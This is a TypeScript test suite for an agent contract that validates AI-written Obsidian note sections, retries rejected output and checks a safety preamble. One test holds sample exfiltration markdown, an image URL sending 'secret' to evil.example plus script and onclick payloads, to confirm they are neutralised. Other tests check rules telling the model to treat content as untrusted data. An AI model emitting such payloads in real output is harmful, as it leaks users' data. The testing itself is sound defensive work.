import { describe, expect, test } from "bun:test";
import { AI_BLOCK_END, type Section } from "../src/note/markers.js";
import {
  buildSectionOutputSchema,
  DEFAULT_EDITORIAL_GUIDANCE,
  ENHANCEMENT_SAFETY_PREAMBLE,
  MAX_HEADING_CHARACTERS,
  MAX_MARKDOWN_CHARACTERS,
  MAX_SECTIONS,
  MAX_TOTAL_SECTION_CHARACTERS,
  queryForSections,
  validateSectionOutput,
  type AgentClient,
  type AgentQueryRequest,
  type AgentQueryResponse,
} from "../src/agent/contract.js";

const valid = [{ heading: "Summary", markdown: "Done" }];

describe("the two-attempt contract loop over structured output", () => {
  test("retries once then skips and preserves the last good sections", async () => {
    const rejected = envelope([{ heading: "Summary", markdown: AI_BLOCK_END }]);
    const agent = new SequenceAgent([
      { structuredOutput: rejected, sessionId: "session-a" },
      { structuredOutput: rejected, sessionId: "session-b" },
    ]);
    const lastGood: readonly Section[] = [{ heading: "Existing", markdown: "Keep me" }];
    const errors: string[] = [];
    const result = await queryForSections(agent, request(), lastGood, { error: (message) => errors.push(String(message)) });
    expect(agent.requests).toHaveLength(2);
    expect(agent.requests[1]?.prompt).toContain("Validation error");
    expect(agent.requests[1]?.prompt).toContain("ownership marker");
    expect(result).toEqual(expect.objectContaining({ status: "skipped", sections: lastGood, attempts: 2 }));
    expect(errors[0]).toContain("OUTPUT REJECTED AFTER TWO ATTEMPTS");
  });

  test("a same-pass retry resumes the first attempt's session id", async () => {
    const agent = new SequenceAgent([
      { structuredOutput: envelope([]), sessionId: "session-first-attempt" },
      { structuredOutput: envelope(valid), sessionId: "session-second-attempt" },
    ]);
    const result = await queryForSections(agent, request(), [], { error: () => {} });
    expect(agent.requests).toHaveLength(2);
    expect(agent.requests[0]).not.toHaveProperty("sessionId");
    expect(agent.requests[1]?.sessionId).toBe("session-first-attempt");
    expect(result).toEqual(expect.objectContaining({ status: "valid", sessionId: "session-second-attempt" }));
  });

  test("absent structured output is corrected on a second attempt, not treated as a query error", async () => {
    const agent = new SequenceAgent([
      { structuredOutput: undefined, sessionId: "session-exhausted" },
      { structuredOutput: envelope(valid), sessionId: "session-recovered" },
    ]);
    const result = await queryForSections(agent, request(), [], { error: () => {} });
    expect(agent.requests).toHaveLength(2);
    expect(agent.requests[1]?.prompt).toContain("no structured output");
    expect(result).toEqual(expect.objectContaining({ status: "valid", attempts: 2 }));
  });

  test("the corrective attempt carries the transport's diagnostics, or it is a retry with nothing new to say", async () => {
    const agent = new SequenceAgent([
      {
        structuredOutput: undefined,
        sessionId: "session-exhausted",
        diagnostics: ["sections.0.heading: expected string, received number"],
      },
      { structuredOutput: envelope(valid), sessionId: "session-recovered" },
    ]);
    const errors: string[] = [];
    await queryForSections(agent, request(), [], { error: (message) => errors.push(String(message)) });
    expect(agent.requests[1]?.prompt).toContain("sections.0.heading: expected string, received number");
  });
});

class SequenceAgent implements AgentClient {
  readonly requests: AgentQueryRequest[] = [];
  readonly #responses: AgentQueryResponse[];

  constructor(responses: AgentQueryResponse[]) {
    this.#responses = responses;
  }

  async query(requestValue: AgentQueryRequest): Promise<AgentQueryResponse> {
    this.requests.push(requestValue);
    const response = this.#responses.shift();
    if (response === undefined) throw new Error("No fake response configured.");
    return response;
  }
}

function request(): AgentQueryRequest {
  return {
    prompt: "enhance",
    systemPrompt: "contract",
    cwd: process.cwd(),
    tools: [],
    settingSources: [],
    maxTurns: 2,
    outputSchema: buildSectionOutputSchema(),
  };
}

describe("structured output schema", () => {
  test("roots the section array in an object envelope", () => {
    const schema = buildSectionOutputSchema();
    expect(schema).toMatchObject({
      type: "object",
      required: ["sections"],
      additionalProperties: false,
    });
    expect(Object.keys(node(schema, "properties"))).toEqual(["sections"]);
  });

  test("carries the zod limits, so a limit edit that fails to propagate is caught here", () => {
    const sections = node(buildSectionOutputSchema(), "properties", "sections");
    expect(sections.type).toBe("array");
    expect(sections.minItems).toBe(1);
    expect(sections.maxItems).toBe(MAX_SECTIONS);
    const properties = node(sections, "items", "properties");
    expect(node(properties, "heading").maxLength).toBe(MAX_HEADING_CHARACTERS);
    expect(node(properties, "markdown").maxLength).toBe(MAX_MARKDOWN_CHARACTERS);
    expect(node(sections, "items").additionalProperties).toBe(false);
    expect(node(sections, "items").required).toEqual(["heading", "markdown"]);
  });

  test("describes every field, because the descriptions replace the deleted prose contract", () => {
    const sections = node(buildSectionOutputSchema(), "properties", "sections");
    const properties = node(sections, "items", "properties");
    expect(String(sections.description)).toContain("full desired state");
    expect(String(node(properties, "heading").description)).toContain("level-two heading");
    expect(String(node(properties, "markdown").description)).toContain("Obsidian");
  });

  test("omits the dialect declaration, which is meaningless on a nested subschema", () => {
    const sections = node(buildSectionOutputSchema(), "properties", "sections");
    expect(sections).not.toHaveProperty("$schema");
  });
});

describe("structured section validation", () => {
  test("accepts a well-formed envelope", () => {
    expect(validateSectionOutput(envelope(valid))).toEqual({ ok: true, sections: valid });
  });

  test("names the SDK's own retry exhaustion apart from a zod rejection", () => {
    const exhausted = validateSectionOutput(undefined);
    const rejected = validateSectionOutput(envelope([]));
    expect(exhausted).toMatchObject({ ok: false, error: expect.stringContaining("no structured output") });
    expect(rejected.ok).toBe(false);
    if (!exhausted.ok && !rejected.ok) expect(exhausted.error).not.toBe(rejected.error);
  });

  test("rejects a bare array, because the envelope is the contract", () => {
    expect(validateSectionOutput(valid)).toMatchObject({
      ok: false,
      error: expect.stringContaining("sections"),
    });
  });

  test("keeps raw newlines and markdown code fences inside a markdown field", () => {
    expect(validateSectionOutput(envelope([{ heading: "API", markdown: "```ts\nfoo()\n```\ndone" }]))).toEqual({
      ok: true,
      sections: [{ heading: "API", markdown: "```ts\nfoo()\n```\ndone" }],
    });
  });

  test("trims edge newlines before writer validation", () => {
    expect(validateSectionOutput(envelope([{ heading: "Summary", markdown: "\n- item\n" }]))).toEqual({
      ok: true,
      sections: [{ heading: "Summary", markdown: "- item" }],
    });
  });

  test("neutralizes external images and dangerous raw HTML", () => {
    const markdown = '![](https://evil.example/?d=secret)\n<img src="https://evil.example/x">\n<script>alert(1)</script>\n<div onclick="steal()">x</div>';
    const result = validateSectionOutput(envelope([{ heading: "Summary", markdown }]));
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.sections[0]!.markdown).toContain("`![](https://evil.example/?d=secret)`");
      expect(result.sections[0]!.markdown).not.toContain("<img");
      expect(result.sections[0]!.markdown).not.toContain("<script");
      expect(result.sections[0]!.markdown).not.toContain("<div onclick=");
      expect(result.sections[0]!.markdown).toContain("&lt;img");
    }
  });

  test("rejects empty arrays and unusable headings", () => {
    expect(validateSectionOutput(envelope([])).ok).toBe(false);
    expect(validateSectionOutput(envelope([{ heading: " ", markdown: 3 }])).ok).toBe(false);
    expect(validateSectionOutput(envelope([{ heading: "One\nTwo", markdown: "x" }])).ok).toBe(false);
  });

  test("rejects marker tokens in model output", () => {
    expect(validateSectionOutput(envelope([{ heading: "Summary", markdown: AI_BLOCK_END }]))).toMatchObject({
      ok: false,
      error: expect.stringContaining("ownership marker"),
    });
  });

  test("rejects a section array over the whole-array character cap", () => {
    const markdown = "x".repeat(MAX_TOTAL_SECTION_CHARACTERS);
    expect(validateSectionOutput(envelope([{ heading: "Summary", markdown }]))).toMatchObject({
      ok: false,
      error: expect.stringContaining(String(MAX_TOTAL_SECTION_CHARACTERS)),
    });
  });

  // The one rejection zod alone cannot make: a level-two heading in a markdown field is a
  // valid string, and only the writer knows it would split the AI-owned block in two.
  test("rejects a level-two heading in a markdown field, which zod accepts and the writer does not", () => {
    expect(validateSectionOutput(envelope([{ heading: "Summary", markdown: "## Nested\ntext" }]))).toEqual({
      ok: false,
      error: "Section markdown contains a level-two heading that would split the block.",
    });
  });
});

function envelope(sections: unknown): unknown {
  return { sections };
}

describe("enhancement system prompt", () => {
  test("carries no machine format contract any more", () => {
    const prompt = `${ENHANCEMENT_SAFETY_PREAMBLE}\n\n${DEFAULT_EDITORIAL_GUIDANCE}`;
    expect(prompt).not.toContain("```json");
    expect(prompt.toLowerCase()).not.toContain("fenced");
    expect(prompt.toLowerCase()).not.toContain("escape");
    expect(prompt).not.toContain('{"heading"');
  });

  test("the fixed half keeps every guard neither the schema nor a refinement can do", () => {
    expect(ENHANCEMENT_SAFETY_PREAMBLE).toContain("untrusted data");
    expect(ENHANCEMENT_SAFETY_PREAMBLE).toContain("marker tokens");
    expect(ENHANCEMENT_SAFETY_PREAMBLE).toContain("level-two headings");
    expect(ENHANCEMENT_SAFETY_PREAMBLE).toContain("host application alone owns writes");
    expect(ENHANCEMENT_SAFETY_PREAMBLE).toContain("authoritative");
  });

  test("the overridable half carries only editorial voice", () => {
    expect(DEFAULT_EDITORIAL_GUIDANCE).toContain("AI-owned section block");
    expect(DEFAULT_EDITORIAL_GUIDANCE).toContain("add, rename, reorder, or drop");
    expect(DEFAULT_EDITORIAL_GUIDANCE).not.toContain("untrusted");
    expect(DEFAULT_EDITORIAL_GUIDANCE).not.toContain("marker");
  });

  test("both halves reach the package entry point, since Phase B seeds a setting from the guidance", async () => {
    const entry = await import("../src/index.js");
    expect(entry.ENHANCEMENT_SAFETY_PREAMBLE).toBe(ENHANCEMENT_SAFETY_PREAMBLE);
    expect(entry.DEFAULT_EDITORIAL_GUIDANCE).toBe(DEFAULT_EDITORIAL_GUIDANCE);
  });
});

function node(schema: Record<string, unknown>, ...path: readonly string[]): Record<string, unknown> {
  let current = schema;
  for (const key of path) current = current[key] as Record<string, unknown>;
  return current;
}
